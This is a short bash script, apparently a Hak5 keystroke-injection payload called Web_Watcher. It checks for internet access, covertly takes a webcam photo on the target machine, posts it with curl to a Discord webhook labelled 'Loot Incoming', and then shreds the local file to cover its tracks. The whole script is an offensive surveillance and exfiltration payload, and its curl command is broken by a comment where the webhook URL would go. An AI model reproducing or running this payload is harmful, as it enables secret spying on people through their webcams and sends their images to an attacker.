# Bash script for Web_Watcher payload that checks for internet connectivity, and if present, takes a picture with the onboard webcam, and then sends it to Discord via webhook.
# fswebcam must be installed on the target system for this script to run correctly (sudo apt install fswebcam).

#!/bin/bash

net_check() {
	ping -c 1 hak5.org
}

user="$(whoami)"

if net_check; then
	fswebcam -q -r 1920x1080 ~/webcam_image.jpeg
	curl -X POST -H "Content-Type: multipart/form-data" \
	-F "file=@/home/$user/webcam_image.jpeg" \
	-F "content=$ Loot Incoming $"\
	# DISCORD WEBHOOK PLACED HERE VIA DUCKYSCRIPT.
	shred -fuz ~/webcam_image.jpeg
else
	exit 0
fi
